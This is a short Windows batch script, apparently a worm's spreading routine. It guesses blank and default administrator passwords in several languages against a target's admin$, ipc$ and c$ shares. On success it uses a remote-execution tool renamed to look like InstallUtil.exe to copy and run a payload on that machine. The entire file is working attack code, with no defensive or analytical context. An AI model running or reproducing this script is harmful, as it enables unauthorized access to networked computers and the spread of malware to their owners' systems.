@echo off
set cracker=net use         
set sender=InstallUtil.exe
%cracker% \\%1\admin$ "" /user:administrator 
if not errorlevel 1 goto send
%cracker% \\%1\ipc$ "" /user:administrator 
if not errorlevel 1 goto send
%cracker% \\%1\c$ "" /user:administrator 
if not errorlevel 1 goto send
%cracker% \\%1\admin$ "" /user:admin
if not errorlevel 1 goto send
%cracker% \\%1\ipc$ "" /user:admin 
if not errorlevel 1 goto send
%cracker% \\%1\c$ "" /user:admin
if not errorlevel 1 goto send
%cracker% \\%1\admin$ "" /user:administrador
if not errorlevel 1 goto send
%cracker% \\%1\ipc$ "" /user:administrador 
if not errorlevel 1 goto send
%cracker% \\%1\c$ "" /user:administrador 
if not errorlevel 1 goto send
%cracker% \\%1\admin$ "" /user:administrateur
if not errorlevel 1 goto send
%cracker% \\%1\ipc$ "" /user:administrateur 
if not errorlevel 1 goto send
%cracker% \\%1\c$ "" /user:administrateur 
if not errorlevel 1 goto send
%cracker% \\%1\admin$ "administrator" /user:administrator
if not errorlevel 1 goto send
%cracker% \\%1\ipc$ "administrator" /user:administrator 
if not errorlevel 1 goto send
%cracker% \\%1\c$ "administrator" /user:administrator 
if not errorlevel 1 goto send
%cracker% \\%1\admin$ "admin" /user:administrator
if not errorlevel 1 goto send
%cracker% \\%1\ipc$ "admin" /user:administrator 
if not errorlevel 1 goto send
%cracker% \\%1\c$ "admin" /user:administrator 
if not errorlevel 1 goto send              
goto end
:send
%sender% \\%1 attrib.exe -r %2
%sender% \\%1 -f -c -d %2 -o
%sender% \\%1 -d %2 -o
:end